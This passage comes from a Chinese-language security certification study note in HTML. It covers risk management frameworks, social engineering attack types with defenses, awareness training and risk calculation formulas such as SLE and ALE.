title="分类"></a>分类</h5><p>根据对损失影响的分析，对系统以及系统处理、存储和传输的信息进行分类</p><h5 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h5><p>为系统选择一组初始控制并根据需要定制控制，以根据风险评估将风险降到可以接受的水平</p><h5 id="实施"><a href="#实施" class="headerlink" title="实施"></a>实施</h5><p>实施控制并描述如何在系统及其操作系统环境中使用控制</p><h5 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h5><p>评估控制以确定控制是否正确实施，是否按照预期运行以及是否产生满足安全和隐私要求的预期结果。</p><h5 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h5><p>在确定组织运营和资产、个人、其他组织和国家&#x2F;地区面临的风险是可接受的基础上，授权系统或共同控制。</p><h5 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h5><p>持续监控系统和相关控制，包括评估控制有效性，记录系统和操作环境的变化，进行风险评估和影响分析，以及报告系统的安全和隐私状况。</p><h3 id="网络安全框架-CSF"><a href="#网络安全框架-CSF" class="headerlink" title="网络安全框架 CSF"></a>网络安全框架 CSF</h3><p>网络安全框架（cybersecurity framework，CSF）</p><p>为关键基础设施和商业组织设计</p><p>改进系统</p><p>功能组成：</p><ul><li>识别</li><li>保护</li><li>检测</li><li>响应</li><li>恢复</li></ul><h1 id="2-3-社会工程"><a href="#2-3-社会工程" class="headerlink" title="2.3 社会工程"></a>2.3 社会工程</h1><p>社会工程是一种利用人类天性和人类行为的攻击形式。</p><p>社会工程攻击利用的是人类的特性。</p><p>必须考虑人员给组织带来的风险并实施安全策略以最小化这些风险并处理这些风险。</p><p>社会工程攻击有两种主要形式：</p><p>说服某人执行未经授权的操作</p><p>说服某人泄露机密信息</p><p>成功攻击的结果是信息泄露或攻击者被授予对安全环境的逻辑或物理访问权限。</p><p>每当发送安全破坏事件时，都应进行调查以确定受影响的内容以及攻击是否还在持续进行。</p><p>任何未遂的或成功的社会工程违规行为都应得到彻底调查和响应。</p><p>防御社会工程攻击的方法包括：</p><ul><li>对人员进行培训，介绍社会工程攻击以及如何识别常见的攻击特征。</li><li>通过电话为人员执行活动时需要进行身份认证。</li><li>定义受限信息，这些信息绝对不能通过电话或标准电子邮件等纯文本通信方式传达。</li><li>始终验证维修人员的身份凭证并验证是否有授权人员拨打了真实的服务电话。</li><li>切勿在未通过至少两个独立且受信任的来源验证信息的情况下，执行来自电子邮件的指令。</li><li>与任何你不认识或不认识你的人打交道时，无论是面对面、通过电话还是通过互联网&#x2F;网络，都需要谨慎行事。</li></ul><p>防御社会工程攻击最重要的措施是用户教育和意识培训。</p><p>培训应包括角色扮演和演练，以展示大量各种形式的社会工程攻击示例。</p><p>用户应在入职组织时接受培训，并且应定期接受巩固培训。</p><h2 id="2-3-1-社会工程原理"><a href="#2-3-1-社会工程原理" class="headerlink" title="2.3.1 社会工程原理"></a>2.3.1 社会工程原理</h2><p>社会工程攻击的原理是关注人性的各个方面并加以利用。</p><h3 id="权威"><a href="#权威" class="headerlink" title="权威"></a>权威</h3><p>权威是一种有效的技巧，因为大多数人可能会顺从地响应权威。</p><h3 id="恐吓"><a href="#恐吓" class="headerlink" title="恐吓"></a>恐吓</h3><p>恐吓有时可以被视为权威原理的衍生品。</p><p>恐吓利用权威、信任甚至威胁伤害来推动某人执行命令或指示。</p><p>恐吓的重点是在未明确定义的操作或响应指令的情况下利用不确定性。</p><h3 id="共识"><a href="#共识" class="headerlink" title="共识"></a>共识</h3><p>共识或社会认同是利用一个人的自然倾向的行为。</p><p>人们倾向于模仿他人正在做的事情或过去做过的事情。</p><h3 id="稀缺性"><a href="#稀缺性" class="headerlink" title="稀缺性"></a>稀缺性</h3><p>稀缺性是一种用于使某人相信某个目标因其稀缺性而具有更高价值的技术。</p><h3 id="熟悉"><a href="#熟悉" class="headerlink" title="熟悉"></a>熟悉</h3><p>熟悉或喜欢是一种社会工程原理，它试图利用一个人对熟悉事物的固有信任。</p><h3 id="信任"><a href="#信任" class="headerlink" title="信任"></a>信任</h3><p>在信任这一社会工程原则中，攻击者努力与受害者建立关系。</p><h3 id="紧迫性"><a href="#紧迫性" class="headerlink" title="紧迫性"></a>紧迫性</h3><p>紧迫性通常与稀缺性相呼应，因为稀缺性代表错失的风险更大，所以迅速采取行动的需求就会增加。</p><p>紧迫性通常被用作一种方法，试图在目标人员有时间仔细考虑或拒绝服从之前，从目标人员那里获得快速反应。</p><h2 id="2-3-2-获取信息"><a href="#2-3-2-获取信息" class="headerlink" title="2.3.2 获取信息"></a>2.3.2 获取信息</h2><p>获取信息是指从系统或人员那里收集或汇聚信息的活动。</p><p>目的是说服你采取行动或作出有利于攻击者的回应。</p><p>社会工程既是侦察工具，又是攻击工具。</p><p>通过社会工程收集的数据可用于支持物理或逻辑&#x2F;技术攻击。</p><p><strong>信息获取防范措施</strong></p><ul><li>对信息进行分类</li><li>控制敏感数据的移动</li><li>监控尝试权限滥用的行为</li><li>培训人员</li><li>向安全团队报告任何可疑活动</li></ul><h2 id="2-3-3-前置词"><a href="#2-3-3-前置词" class="headerlink" title="2.3.3 前置词"></a>2.3.3 前置词</h2><p>前置词是在其他通信的开头或标题中添加的一个术语、表达式或短语。</p><p>通常使用前置词是为了进一步完善或建立社会工程攻击的借口，例如垃圾邮件、恶作剧或网络钓鱼。</p><p>前置词攻击还可用于欺骗过滤器，如垃圾邮件过滤器、反恶意软件、防火墙和入侵检测系统（IDS）。</p><h2 id="2-3-4-网络钓鱼"><a href="#2-3-4-网络钓鱼" class="headerlink" title="2.3.4 网络钓鱼"></a>2.3.4 网络钓鱼</h2><p>网络钓鱼（phishing）是一种社会工程攻击形式，主要是从任何潜在的目标窃取凭证或身份信息。</p><p>网络钓鱼可以使用各种通信媒体以多种方式进行：<br>电子邮件和网络</p><p>面对面的交流</p><p>电话</p><p>传统通信媒介：邮寄或快递包裹</p><p>为了防御网络钓鱼攻击，最终用户应接受以下培训：</p><ul><li>警惕意外的电子邮件或来自未来发件人的电子邮件</li><li>切勿打开意外的电子邮件附件</li><li>切勿通过电子邮件分享敏感信息</li><li>避免点击电子邮件、即时消息或社交网络消息中收到的任何链接。</li></ul><p>组织应该考虑通过公司系统授予员工访问个人电子邮件和社交网络的权限所带来的后果和增加的风险。</p><p>网络钓鱼模拟器是一种用于评估员工抵抗或参与网络钓鱼活动的能力的工具。</p><h2 id="2-3-5-鱼叉式网络钓鱼"><a href="#2-3-5-鱼叉式网络钓鱼" class="headerlink" title="2.3.5 鱼叉式网络钓鱼"></a>2.3.5 鱼叉式网络钓鱼</h2><p>鱼叉式网络钓鱼（spear phishing）是一种更有针对性的网络钓鱼形式，其中信息是专门针对一个特定用户群体制作的。</p><p>商业电子邮件泄露（BEC）。</p><p>与大多数形式的社会工程一样，防范鱼叉式网络钓鱼时应做到以下几点：</p><ul><li>用价值、重要性或敏感程度对信息、数据和资产打标签。</li><li>培训人员基于标签来正确处理相关资产。</li><li>要求澄清或确认任何看似异常、偏离流程或对组织有过度风险的行为。</li></ul><h2 id="2-3-6-网络钓鲸"><a href="#2-3-6-网络钓鲸" class="headerlink" title="2.3.6 网络钓鲸"></a>2.3.6 网络钓鲸</h2><p>网络钓鲸（whaling）是鱼叉式网络钓鱼的一种变体，针对的是特定的高价值人员（按照头衔、行业、媒体报告等）。</p><h2 id="2-3-7-短信钓鱼"><a href="#2-3-7-短信钓鱼" class="headerlink" title="2.3.7 短信钓鱼"></a>2.3.7 短信钓鱼</h2><p>短消息服务（SMS）网络钓鱼或短信钓鱼（smishing，即时消息垃圾邮件）是一种社会工程攻击，发生在标准文本消息服务之上或通过标准文本消息服务允许。</p><p>需要警惕的短信钓鱼威胁：</p><ul><li>要求响应或回复的短信。</li><li>短信可能包含指向网络钓鱼或诈骗网站的超链接&#x2F;URL&#x2F;URI，或触发恶意代码软件的安装。</li><li>短信可能包含让你参与对话的借口。</li><li>短信可能包含电话号码。</li></ul><h2 id="2-3-8-语音网络钓鱼"><a href="#2-3-8-语音网络钓鱼" class="headerlink" title="2.3.8 语音网络钓鱼"></a>2.3.8 语音网络钓鱼</h2><p>语音网络钓鱼（vishing，即基于语音的网络钓鱼）或 SpIT（互联网电话垃圾邮件）是通过任何电话或语音通信系统进行的网络钓鱼。</p><p>包括传统电话线、语音（VoIP）服务和移动电话。</p><p>防御措施：</p><p>始终假设来电 ID 是错误的或至少是不正确的。</p><h2 id="2-3-9-垃圾邮件"><a href="#2-3-9-垃圾邮件" class="headerlink" title="2.3.9 垃圾邮件"></a>2.3.9 垃圾邮件</h2><p>垃圾邮件（spam）是任何类型的不受欢迎和&#x2F;或未经请求的电子邮件。</p><p>垃圾邮件包括不受欢迎的广告，还可能包括恶意内容和攻击向量。</p><p>垃圾邮件产生的原因：</p><ul><li>一些垃圾邮件带有恶意代码，如病毒、逻辑炸弹、勒索软件或特洛伊木马。</li><li>一些垃圾邮件带有社会工程攻击（也称为恶作剧信息）。</li><li>不需要的电子邮件会浪费你的时间。</li><li>垃圾邮件浪费互联网资源：存储容量、计算周期和吞吐量。</li></ul><p>防御措施：<br>使用垃圾电子邮件过滤器，检查邮件标题、主题和内容，查找将其识别为已知垃圾邮件类型的关键词或短语，采取适当的措施来丢弃、隔离或阻止邮件。</p><p>反垃圾邮件软件是反恶意软件主题的一个变体。专门监视电子邮件通信中的垃圾邮件和其他形式的不需要的电子邮件。</p><p>反垃圾邮件软件可以安装在电子邮件服务器上，也可以安装在本地客户端系统上。</p><p>企业级垃圾邮件工具：<br>发件人策略框架（SPF）</p><p>域密钥识别邮件（DKIM）</p><p>域消息身份认证报告和一致性（DMARC），可用于过滤虚假的消息（具有虚假或伪造源地址的邮件）</p><p>垃圾邮件存在于电子邮件、即时消息（IM）、SMS、USENET（网络新闻传输协议）和 Web 内容。</p><p>垃圾邮件危害：</p><ul><li>浪费资源</li><li>消耗带宽</li><li>分散工作人员的生产活动注意力</li><li>使用户和系统遭遇恶意软件</li></ul><h2 id="2-3-10-肩窥"><a href="#2-3-10-肩窥" class="headerlink" title="2.3.10 肩窥"></a>2.3.10 肩窥</h2><p>肩窥（shoulder surfing）是一种通常发生在现实世界或以面对面形式发生的社会工程攻击。</p><p>防御措施：</p><p>1、按敏感级别分组员工，使用物理手段限制进入。</p><p>2、用户不应该将其显示器放在容易被看见的方向。</p><p>3、不应该在公共场所处理敏感数据。</p><p>4、键入字符时使用密码字段来屏蔽字符。</p><p>5、使用屏幕过滤器，将视野限制在垂直方向</p><h2 id="2-3-11-发票诈骗"><a href="#2-3-11-发票诈骗" class="headerlink" title="2.3.11 发票诈骗"></a>2.3.11 发票诈骗</h2><p>发票诈骗（invoice scam）是一种社会工程攻击，通常通过提供虚假发票然后强烈诱使付款，以期望从组织或个人那里窃取资金。</p><p>以财务部门或会计团队的成员为目标。</p><p>一些发票诈骗实际上是变相的鱼叉式网络钓鱼诈骗。</p><p>一些发票诈骗会与 BEC 相结合。</p><p>防御措施：</p><ul><li>必须告知员工他们应该通过那些适当的渠道接收发票以及确认任何发票实际有效的方法。</li><li>员工之间应存在职责分离和第三个小组审计活动。</li><li>发现任何欺诈性发票应该向行政部门报告。</li></ul><h2 id="2-3-12-恶作剧"><a href="#2-3-12-恶作剧" class="headerlink" title="2.3.12 恶作剧"></a>2.3.12 恶作剧</h2><p>恶作剧（hoax）是一种社会工程，旨在说服目标执行会导致问题或降低其 IT 安全性的操作。</p><p>防御措施：<br>每当遇到一个潜在的恶作剧，或者只是担心一个声称的威胁是真实的，请进行探究。</p><h2 id="2-3-13-假冒和伪装"><a href="#2-3-13-假冒和伪装" class="headerlink" title="2.3.13 假冒和伪装"></a>2.3.13 假冒和伪装</h2><p>假冒（impersonation）是假冒他人身份的行为。</p><p>假冒可以通过个人、电话、电子邮件、登录某人的账户或通过任何其他通信方式进行。</p><p>假冒也被称为伪装、欺骗，甚至是身份欺诈。</p><p>假冒被定义为更精细和复杂的攻击。</p><p>伪装（masquerading）则是业余的和更简单的。</p><p>防御措施：</p><ul><li>使用通行证和安保人员</li><li>所有入口处出示和验证 ID</li><li>访客提供详细的身份信息，预先安排，向安保提供合理且确认的通知，访客到达，比对凭证，全程陪同</li></ul><h2 id="2-3-14-尾随和捎带"><a href="#2-3-14-尾随和捎带" class="headerlink" title="2.3.14 尾随和捎带"></a>2.3.14 尾随和捎带</h2><h3 id="尾随"><a href="#尾随" class="headerlink" title="尾随"></a>尾随</h3><p>当一个未经授权的实体利用一个合法员工的授权，在该员工并不知情的情况下进入一个设施时，就会发生<strong>尾随</strong>（tailgating）行为。</p><p>尾随是一种攻击行为，攻击并不需要获得受害者的同意。</p><p>防御措施：</p><ul><li>改变用户行为</li><li>访问控制门厅（以前称为陷阱）</li><li>安全摄像头</li><li>安保人员</li></ul><h3 id="捎带"><a href="#捎带" class="headerlink" title="捎带"></a>捎带</h3><p>类似尾随的问题是<strong>捎带</strong>（piggybacking）。</p><p>当未经授权的实体通过诱骗获得受害者的同意并在合法工作人员的授权下进入设施时。</p><p>防御措施：</p><ul><li>要求提供授权证明或替他们耍门禁卡</li><li>引导到由保安控制的主要入口或叫保安处理</li><li>访问控制门厅</li><li>旋转门</li><li>安全摄像头</li></ul><h3 id="诱饵"><a href="#诱饵" class="headerlink" title="诱饵"></a>诱饵</h3><p>当无法直接以物理方式进入或尝试失败时，攻击者可能会使用诱饵技术将恶意软件植入内部系统。</p><p>手段：</p><p>USB 存储器</p><p>光盘</p><p>钱包</p><h2 id="2-3-15-垃圾箱搜寻"><a href="#2-3-15-垃圾箱搜寻" class="headerlink" title="2.3.15 垃圾箱搜寻"></a>2.3.15 垃圾箱搜寻</h2><p>垃圾箱搜寻（dumpster diving）是通过挖掘垃圾、废弃设备或废弃地点来获取有关目标组织或个人信息的行为。</p><p>典型收集内容：</p><p>旧日历</p><p>通话清单 </p><p>手写的会议记录</p><p>废弃表格</p><p>产品盒</p><p>用户手册</p><p>便利贴</p><p>打印的报告</p><p>打印机的测试表</p><p>防御措施：</p><ul><li>文件丢弃之前应该都被切碎和&#x2F;或焚烧</li><li>使用安全的处置技术或服务处理存储介质，例如：焚烧、切碎或碎裂</li></ul><h2 id="2-3-16-身份欺诈"><a href="#2-3-16-身份欺诈" class="headerlink" title="2.3.16 身份欺诈"></a>2.3.16 身份欺诈</h2><p>身份欺诈（identity fraud）和身份盗窃是经常互换使用的术语。</p><p>身份盗窃是窃取某人身份的行为。</p><p>身份盗窃的第一个定义：实际盗窃某人的账户或财务状况的凭证和信息。</p><p>身份盗窃的第二个定义：那些被盗的凭证和详细信息被用来接管某人的账户。</p><p>当攻击者窃取并使用受害者的凭证时，被称为凭证劫持。</p><p>欺诈指的是任何隐藏有效身份的行为，通常通过使用其他身份来实现。除了以人为中心的欺骗（即身份欺诈）概念外，欺骗是黑客在技术上的常见策略。</p><p>身份盗窃和身份欺诈也与假冒有关。假冒是以某人的身份出现的行为</p><p>防御措施：</p><ul><li>采取行动减少自己的脆弱性</li><li>增加发现攻击的机会</li><li>提供对不公正行为的防御能力</li></ul><h2 id="2-3-17-误植域名"><a href="#2-3-17-误植域名" class="headerlink" title="2.3.17 误植域名"></a>2.3.17 误植域名</h2><p>误植域名（typo squatting）是一种在用户错误输入目标资源的域名或 IP 地址时捕获的重定向流量的做法。</p><p>URL 劫持可以指某种显示链接或广告的做法。</p><p>点击劫持是一种将用户在网页上的点击或选择重定向到备用的、通常是恶意的目标（而不是计划和期望位置）的方法。</p><p>点击劫持实现方法：</p><ul><li>更改原始网页代码，使其包含某种脚本，点击或选择时自动替换 URL。</li><li>在显示的页面上添加不可见或隐藏的覆盖、框架或图像映射。</li></ul><p>点击劫持可用于：</p><ul><li>执行网络钓鱼攻击、劫持和路径攻击</li></ul><h2 id="2-3-18-影响力运动"><a href="#2-3-18-影响力运动" class="headerlink" title="2.3.18 影响力运动"></a>2.3.18 影响力运动</h2><p>影响力运动（influence campaign）</p><p>试图引导、调整和改变公众舆论的社会工程攻击。</p><p>主要由民族国家针对外部敌人发起的。</p><p>影响力运动与散布虚假信息、鼓动、错误信息、“假新闻”，甚至与 Doxing 活动相关。</p><p>Doxing 是指收集有关个人或组织的信息，以便公开披露收集的数据，以指向对目标的感知。</p><h3 id="1-混合战争-hybrid-warfare"><a href="#1-混合战争-hybrid-warfare" class="headerlink" title="1. 混合战争 hybrid warfare"></a>1. 混合战争 hybrid warfare</h3><p>传统的军事战略与现代能力相结合，包括社会工程、数字影响力运动、心理战、政治战术和网络战争能力。</p><p>也称为非线性战争。</p><p>混合战争中，伤害的不仅仅是身体，还可能损害声誉、财务、数字基础设施和人际关系。</p><h3 id="2-社交媒体-social-media"><a href="#2-社交媒体-social-media" class="headerlink" title="2. 社交媒体 social media"></a>2. 社交媒体 social media</h3><p>社交媒体成为民族国家手中一件武器，对目标发动混合战争。</p><p>应对措施：</p><ul><li>防火墙添加 IP 地址块阻止人员对社交媒体网站的访问</li><li>添加域名系统（DNS）查询的解析过滤器阻止人员对社交媒体网站的访问</li></ul><h1 id="2-4-建立和维护安全意识、教育和培训计划"><a href="#2-4-建立和维护安全意识、教育和培训计划" class="headerlink" title="2.4 建立和维护安全意识、教育和培训计划"></a>2.4 建立和维护安全意识、教育和培训计划</h1><p>为成功实施安全解决方案，必须改变用户行为。</p><h2 id="2-4-1-安全意识"><a href="#2-4-1-安全意识" class="headerlink" title="2.4.1 安全意识"></a>2.4.1 安全意识</h2><p>实施安全培训的一个前提条件是建立安全意识。</p><p>建立安全意识的目标是让用户将安全放到首位并认可。</p><p>建立了对安全认知的最小化的通用标准或基础。</p><p>安全意识培养途径</p><ul><li><p>课堂的教学演示</p></li><li><p>工作环境中的提示信息（海报、新闻通讯文章和屏幕保护程序等）</p></li></ul><p>用户必须了解的安全意识问题：规避浪费、欺诈和未经授权的活动。</p><p>为确保安全意识程序有效性，必须及时、有创造性且经常更新。</p><p>适用范围：高级管理人员到临时的实习生，都需要构建同样的安全意识水平</p><h2 id="2-4-2-培训"><a href="#2-4-2-培训" class="headerlink" title="2.4.2 培训"></a>2.4.2 培训</h2><p>教导员工执行工作任务和遵守安全策略。</p><p>新员工都需要培训。</p><p>培训是需要持续进行的活动，员工任职期间都必须持续接受培训。</p><p>培训是一种管理性安全控制。</p><p>安全意识和培训的方法和技术需要随时间修订和改进。</p><p>安全意识和培训通常由内部提供。</p><h2 id="2-4-3-教育"><a href="#2-4-3-教育" class="headerlink" title="2.4.3 教育"></a>2.4.3 教育</h2><p>更详细的工作。</p><p>学习的内容要比工作任务需要的内容多得多。</p><p>教育最常与寻求资质认证和工作晋升相关联。</p><p>安全专业人员需要掌握大量的安全知识并对整个组织环境有广泛了解。</p><h2 id="2-4-4-改进"><a href="#2-4-4-改进" class="headerlink" title="2.4.4 改进"></a>2.4.4 改进</h2><p>提高安全意识和培训的技巧</p><ul><li>改变培训的目标重点，变换目标。</li><li>改变培训主体顺序或重点，变换内容方向。</li><li>使用多种演示方法。</li><li>通过角色扮演的方式。</li></ul><p>发展和鼓励安全带头人</p><p>提升安全意识和改进培训方式：</p><ul><li>游戏化</li><li>夺旗演戏</li><li>模拟网络钓鱼</li><li>基于计算机的培训 CBT</li><li>基于角色的培训</li></ul><h2 id="2-4-5-有效性评估"><a href="#2-4-5-有效性评估" class="headerlink" title="2.4.5 有效性评估"></a>2.4.5 有效性评估</h2><p>必须对所有培训材料进行定期的内容审查。</p><p>审查有助于确保培训材料和演示文稿与业务目标、组织使命和安全目标保持一致。</p><p>使用新方法和技巧确保安全意识和培训内容新鲜感和相关性。</p><p>安全治理团队的责任是建立安全策略，并为进一步实施提供培训和教育。</p><p>应该持续进行或者在可持续的基础上开展培训和安全意识计划有效性评估。</p><p>培训-&gt;立即测验-&gt;长期测验-&gt;审查事件和日志</p><h1 id="2-6-考试要点"><a href="#2-6-考试要点" class="headerlink" title="2.6 考试要点"></a>2.6 考试要点</h1><h2 id="理解人员是安全的关键元素"><a href="#理解人员是安全的关键元素" class="headerlink" title="理解人员是安全的关键元素"></a>理解人员是安全的关键元素</h2><p>在所有安全解决方案中，人员经常被视为最脆弱的元素。</p><p>无论部署了什么物理或逻辑控制措施，人总是可以找到方法来规避、绕过控制措施，使控制措施失效。</p><p>不过，当人员受到适当的培训，并被激励去保护自己和组织的安全时，他们也可以成为关键的安全资产。</p><h2 id="了解岗位描述的重要性"><a href="#了解岗位描述的重要性" class="headerlink" title="了解岗位描述的重要性"></a>了解岗位描述的重要性</h2><p>如果没有岗位描述，就不能对应该招聘哪类人员达成共识，因此，制定岗位描述是定义与人员相关的安全需求并招聘新员工的第一步。</p><h2 id="理解雇佣新员工对安全的影响"><a href="#理解雇佣新员工对安全的影响" class="headerlink" title="理解雇佣新员工对安全的影响"></a>理解雇佣新员工对安全的影响</h2><p>为实施恰当的安全计划，必须为岗位描述、岗位分类、工作任务、岗位职责、防范串通、候选人筛选、背景调查、安全调查、雇佣协议和保密协议等设立标准。</p><p>确保新员工了解所需的安全标准，从而保护组织的资产。</p><h2 id="理解入职和离职"><a href="#理解入职和离职" class="headerlink" title="理解入职和离职"></a>理解入职和离职</h2><p>入职是将新员工添加到组织的流程，包括组织特性的社会化和引导。</p><p>离职是在员工离开组织后，将其身份从 IAM（身份认证管理）系统中删除的流程。</p><h2 id="了解最小特权原则"><a href="#了解最小特权原则" class="headerlink" title="了解最小特权原则"></a>了解最小特权原则</h2><p>最小特权原则指出用户应获得完成其工作任务或工作职责所需的最小访问权限。</p><h2 id="理解保密协议（NDA）的必要性"><a href="#理解保密协议（NDA）的必要性" class="headerlink" title="理解保密协议（NDA）的必要性"></a>理解保密协议（NDA）的必要性</h2><p>NDA 用于保护组织内的机密信息，使其不被前雇员披露。</p><p>当人员签署 NDA 时，他们同意不向组织外部的任何人披露任何被定义为机密的信息。</p><h2 id="了解员工监督"><a href="#了解员工监督" class="headerlink" title="了解员工监督"></a>了解员工监督</h2><p>在员工的整个雇佣过程中，管理人员应定期审查或审核每位员工的岗位描述、工作任务、特权和职责。</p><h2 id="了解强制修改的必要性"><a href="#了解强制修改的必要性" class="headerlink" title="了解强制修改的必要性"></a>了解强制修改的必要性</h2><p>为了审计和核实员工的工作任务和特权，可执行一到两周的强制休假。</p><p>该方法能够轻易发现特权滥用、欺诈或疏忽。</p><h2 id="了解-UBA-和-UEBA"><a href="#了解-UBA-和-UEBA" class="headerlink" title="了解 UBA 和 UEBA"></a>了解 UBA 和 UEBA</h2><p>用户行为分析（UBA）和用户与实体行为分析（UEBA）是为特定目标或意图，对用户、主体、访客、客户等行为进行分析的概念。</p><h2 id="了解人员调动"><a href="#了解人员调动" class="headerlink" title="了解人员调动"></a>了解人员调动</h2><p>人员调动可能被视为开除&#x2F;重新雇佣，而不是人员移动。</p><p>这取决于组织的政策及其认为能最好地管理这一变化的方式。</p><p>决定使用哪个程序的因素包括：是否保留相同的用户账户，是否调整他们的许可，他们的新工作职责是否与以前的职位相似，以及是否需要一个新的“历史清白的”账户以供新工作职位的审计。</p><h2 id="能够解释恰当的解雇策略"><a href="#能够解释恰当的解雇策略" class="headerlink" title="能够解释恰当的解雇策略"></a>能够解释恰当的解雇策略</h2><p>解雇策略规定解雇员工的程序，应该包括有现场证人、禁用员工的网络访问权限和执行离职面谈等内容。</p><p>解雇策略还应包括护送被解雇员工离开公司，并要求其归还安全令牌、徽章和公司财产。</p><h2 id="理解供应商、顾问和承包商的控制"><a href="#理解供应商、顾问和承包商的控制" class="headerlink" title="理解供应商、顾问和承包商的控制"></a>理解供应商、顾问和承包商的控制</h2><p>供应商、顾问和承包商的控制用于确定组织主要的外部实体、人员或组织的绩效水平、期望、补偿金额和影响。</p><p>通常，这些控制条款在 SLA 文档或策略中规定。</p><h2 id="理解策略合规"><a href="#理解策略合规" class="headerlink" title="理解策略合规"></a>理解策略合规</h2><p>合规是符合或遵守规则、策略、法规、标准或要求的行为。</p><p>对安全治理来说，合规是一项重要内容。</p><p>在个人层面，合规与员工个人是否遵守公司策略并按照规定程序执行工作任务有关。</p><h2 id="了解隐私如何融入-IT-安全领域"><a href="#了解隐私如何融入-IT-安全领域" class="headerlink" title="了解隐私如何融入 IT 安全领域"></a>了解隐私如何融入 IT 安全领域</h2><p>了解隐私的多重含义&#x2F;定义，为什么必须保护隐私以及与隐私相关的问题（尤其是在工作环境中）。</p><h2 id="能够定义整体的风险管理"><a href="#能够定义整体的风险管理" class="headerlink" title="能够定义整体的风险管理"></a>能够定义整体的风险管理</h2><p>风险管理过程包括：</p><ul><li>识别可能造成数据损坏或泄露的因素</li><li>根据数据价值和控制措施的成本评估这些因素</li><li>实施具有成本效益的解决方案来减轻或降低缝隙</li></ul><p>通过执行风险管理，为全面降低风险奠定基础。</p><h2 id="理解风险分析和相关要素"><a href="#理解风险分析和相关要素" class="headerlink" title="理解风险分析和相关要素"></a>理解风险分析和相关要素</h2><p>风险分析是向高层管理人员提供详细信息以决定哪些风险应该缓解、哪些风险应该转移、哪些风险应该接受的过程。</p><p>要全面评估风险并采取适当的预防措施，必须分析以下内容：</p><p>资产</p><p>资产估值</p><p>威胁</p><p>脆弱性</p><p>暴露</p><p>风险</p><p>已实现风险</p><p>防护措施</p><p>控制措施</p><p>攻击</p><p>破坏</p><h2 id="了解如何评估威胁"><a href="#了解如何评估威胁" class="headerlink" title="了解如何评估威胁"></a>了解如何评估威胁</h2><p>威胁有许多来源，包括 IT、人类和自然。</p><p>应该以团队形式评估威胁以提供最广泛的视角。</p><p>通过从各个角度全面评估风险，可降低系统的脆弱性。</p><h2 id="理解定性风险分析"><a href="#理解定性风险分析" class="headerlink" title="理解定性风险分析"></a>理解定性风险分析</h2><p>定性风险分析更多的是基于场景，而不是基于计算。</p><p>不用具体的货币价值表示可能的损失，而是对威胁进行分级，以评估其风险、成本和影响。</p><p>这种分析方式可帮助那些负责制定适当的风险管理策略的人员。</p><h2 id="理解-Delphi-技术"><a href="#理解-Delphi-技术" class="headerlink" title="理解 Delphi 技术"></a>理解 Delphi 技术</h2><p>Delphi 技术是一个简单的匿名反馈和响应过程，用于达成共识。</p><p>这样的共识让各责任方有机会正确评估风险并实施解决方案。</p><h2 id="理解定量风险分析"><a href="#理解定量风险分析" class="headerlink" title="理解定量风险分析"></a>理解定量风险分析</h2><p>定量风险分析聚焦于货币价值和百分比。</p><p>完全靠定量分析是不可能的，因为风险的某些方面是无形的。</p><p>定量风险分析包括资产估值和威胁识别，然后确定威胁的潜在发生频率和造成的损害，生成具有防护措施的成本&#x2F;效益分析的风险响应任务。</p><h2 id="能够解释暴露因子（EF）概念"><a href="#能够解释暴露因子（EF）概念" class="headerlink" title="能够解释暴露因子（EF）概念"></a>能够解释暴露因子（EF）概念</h2><p>暴露因子是定量风险分析的一个要素，表示如果已发生的风险对某个特定资产造成了破坏，组织将因此遭受的损失百分比。</p><p>通过计算风险暴露因子，可实施良好的风险管理策略。</p><h2 id="了解单一损失期望（SLE）的含义和计算方式"><a href="#了解单一损失期望（SLE）的含义和计算方式" class="headerlink" title="了解单一损失期望（SLE）的含义和计算方式"></a>了解单一损失期望（SLE）的含义和计算方式</h2><p>SLE 是定量风险分析的一个要素，代表已发生的单个风险给特定资产带来的损失。</p><p>计算公式为：SLE &#x3D; 资产价值（AV）* 暴露因子 （EF）。</p><h2 id="理解年度发生率（ARO）"><a href="#理解年度发生率（ARO）" class="headerlink" title="理解年度发生率（ARO）"></a>理解年度发生率（ARO）</h2><p>ARO 是定量风险分析的一个要素，代表特定威胁或风险在一年内发生（或成为现实）的预期频率。</p><p>进一步了解 ARO，你将能计算风险并采取适当的预防措施。</p><h2 id="了解年度损失期望（ALE）的含义和计算方式"><a href="#了解年度损失期望（ALE）的含义和计算方式" class="headerlink" title="了解年度损失期望（ALE）的含义和计算方式"></a>了解年度损失期望（ALE）的含义和计算方式</h2><p>ALE 是定量风险分析的一个要素，指的是特定资产面临的所有可发生的特定威胁在年度内可能造成的损失成本。</p><p>计算公式为：ALE &#x3D; 单一损失期望（SLE）* 年度发生率（ARO）。</p><h2 id="了解评估防护措施的方式"><a href="#了解评估防护措施的方式" class="headerlink" title="了解评估防护措施的方式"></a>了解评估防护措施的方式</h2><p>除了确定防护措施的年度成本外，还需要为资产计算防护措施实施后的 ALE 。</p><p>可使用这个计算方式：防护措施对公司的价值 &#x3D; 防护措施实施前的 ALE -  防护措施实施后的 ALE - 防护措施的年度成本，或  &#x3D; （ALE1 - ALE2）- ACS</p><h2 id="了解处理风险的方法"><a href="#了解处理风险的方法" class="headerlink" title="了解处理风险的方法"></a>了解处理风险的方法</h2><p>风险降低（即风险缓解）就是防护措施和控制措施的实施。</p><p>风险转让或风险转移是指将风险造成的成本转嫁给另一个实体或组织；</p><p>购买保险是风险转移的一种形式。</p><p>风险威慑是指对可能违反安全和策略的违规者实施威慑的过程。</p><p>风险规避是选择替代的选项或活动的过程，替代选项或活动的风险低于默认的、通用的、权宜的或廉价的选项。</p><p>风险接受意味着管理层已经对可能的防护措施进行了成本&#x2F;效益分析，并且确定防护措施的成本远大于风险可能造成的损失成本。也意味着管理层同意接受风险发生后的结果和损失。</p><h2 id="能够解释总风险、残余风险和控制间隙"><a href="#能够解释总风险、残余风险和控制间隙" class="headerlink" title="能够解释总风险、残余风险和控制间隙"></a>能够解释总风险、残余风险和控制间隙</h2><p>总风险是指如果不实施防护措施，组织将面临的全部风险。</p><p>可以用这个公式计算总风险：</p><p>威胁 * 脆弱性 * 资产价值 &#x3D; 总风险</p><p>残余风险是管理层选择接受而不去减轻的风险。</p><p>总风险和残余风险之间的的差额是控制间隙，即通过实施防护措施而减少的风险。</p><p>残余风险的计算公式为：</p><p>总风险 - 控制间隙 &#x3D; 残余风险。</p><h2 id="理解控制类型"><a href="#理解控制类型" class="headerlink" 